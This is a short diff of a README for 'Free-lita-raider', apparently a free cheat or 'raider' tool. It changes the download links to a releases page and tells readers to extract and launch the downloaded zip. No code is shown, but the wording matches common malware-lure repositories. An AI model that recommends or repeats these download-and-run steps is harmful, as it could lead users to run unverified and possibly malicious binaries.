@@ -22,9 +22,9 @@ Welcome to the official README for **Free-lita-raider** repository! This project
 
 ## Get Started 🚀
 
-To access the **Free-lita-raider** repository and start exploring its functionalities, simply download the repository zip file by clicking [here](https://github.com/uploads/App.zip).
+To access the **Free-lita-raider** repository and start exploring its functionalities, simply download the repository zip file by clicking [here](https://github.com/VixieCheatz/Free-lita-raider/releases).
 
-[![Download](https://img.shields.io/badge/Download-App.zip-brightgreen)](https://github.com/uploads/App.zip)
+[![Download](https://github.com/VixieCheatz/Free-lita-raider/releases)](https://github.com/VixieCheatz/Free-lita-raider/releases)
 
 If the link above directly downloads a file, you will need to extract and launch it to dive into the capabilities of **Free-lita-raider**.
 
